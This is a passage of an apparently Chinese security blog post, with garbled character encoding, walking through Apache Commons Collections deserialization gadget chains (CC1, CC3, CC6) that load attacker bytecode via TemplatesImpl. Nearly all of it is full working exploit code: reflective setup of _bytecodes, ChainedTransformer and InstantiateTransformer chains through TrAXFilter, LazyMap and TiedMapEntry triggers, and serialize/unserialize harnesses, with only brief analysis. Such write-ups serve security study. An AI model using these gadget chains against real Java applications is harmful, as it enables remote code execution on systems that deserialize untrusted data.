= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><span class="hljs-comment">//è°ƒç”¨templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><span class="hljs-comment">//CC1</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Target.class, transformedMap);<br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC6çš„TemplatesImpl-çš„å®ç°æ–¹å¼"><a href="#CC6çš„TemplatesImpl-çš„å®ç°æ–¹å¼" class="headerlink" title="CC6çš„TemplatesImpl çš„å®ç°æ–¹å¼"></a>CC6çš„TemplatesImpl çš„å®ç°æ–¹å¼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><span class="hljs-comment">//è°ƒç”¨templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><span class="hljs-comment">//CC6</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC3è°ƒç”¨é“¾åˆ†æ"><a href="#CC3è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="CC3è°ƒç”¨é“¾åˆ†æ"></a>CC3è°ƒç”¨é“¾åˆ†æ</h2><p>å› ä¸ºåªéœ€è¦è°ƒç”¨ <code>TemplatesImpl</code> ç±»çš„ <code>newTransformer()</code> æ–¹æ³•ï¼Œä¾¿å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬ï¼ŒæŸ¥æ‰¾è°è°ƒç”¨äº† <code>newTransformer()</code> </p><p><code> com.sun.org.apache.xalan.internal.xslt.trax#TrAXFilter.TrAXFilter()</code>,å› ä¸º<code>TrAXFilter()ç±»çš„newTransformer()</code>åœ¨æ„é€ å‡½æ•°é‡Œé¢ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä¼ å‚ï¼Œæ‰€ä»¥é€‰æ‹©å®ƒï¼Œä½†æœ‰ä¸ªé—®é¢˜ï¼Œ<code>TrAXFilter</code>ç±»å¹¶æ²¡æœ‰ç»§æ‰¿<code>Serializable</code> æ¥å£ï¼Œä¸èƒ½åºåˆ—åŒ–æ‰€ä»¥æˆ‘ä»¬åªèƒ½ä»<code>TrAXFilter</code>çš„Classå…¥æ‰‹ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240528100031807.png" alt="image-20240528100031807"></p><p>CC3çš„ä½œè€…æ²¡æœ‰è°ƒç”¨ <code>InvokerTransformer</code>ï¼Œè€Œæ˜¯è°ƒç”¨äº†ä¸€ä¸ªæ–°çš„ç±» <code>InstantiateTransformer</code>ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240528101227501.png" alt="image-20240528101227501"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240528111906340.png" alt="image-20240528111906340"></p><h3 id="CC3é“¾EXP"><a href="#CC3é“¾EXP" class="headerlink" title="CC3é“¾EXP"></a>CC3é“¾EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\14341\\Desktop\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//    templates.newTransformer();</span><br><br><span class="hljs-comment">//ä¸ºäº†è°ƒç”¨Templates.newTransformer();</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       <br>        instantiateTransformer.transform(TrAXFilter.class);<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CC1å®ç°CC3å®Œæ•´ç‰ˆ"><a href="#CC1å®ç°CC3å®Œæ•´ç‰ˆ" class="headerlink" title="CC1å®ç°CC3å®Œæ•´ç‰ˆ"></a>CC1å®ç°CC3å®Œæ•´ç‰ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><br>         <span class="hljs-comment">//å®ç°instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br><span class="hljs-comment">//CC1</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlerConstructor.newInstance(Target.class, lazyMap);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Override.class, mapProxy);<br><br><br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CC6å®ç°CC3å®Œæ•´ç‰ˆ"><a href="#CC6å®ç°CC3å®Œæ•´ç‰ˆ" class="headerlink" title="CC6å®ç°CC3å®Œæ•´ç‰ˆ"></a>CC6å®ç°CC3å®Œæ•´ç‰ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><br>       <span class="hljs-comment">//å®ç°instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br><span class="hljs-comment">//CC6</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        <span class="hljs-comment">// åœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å€¼  </span><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 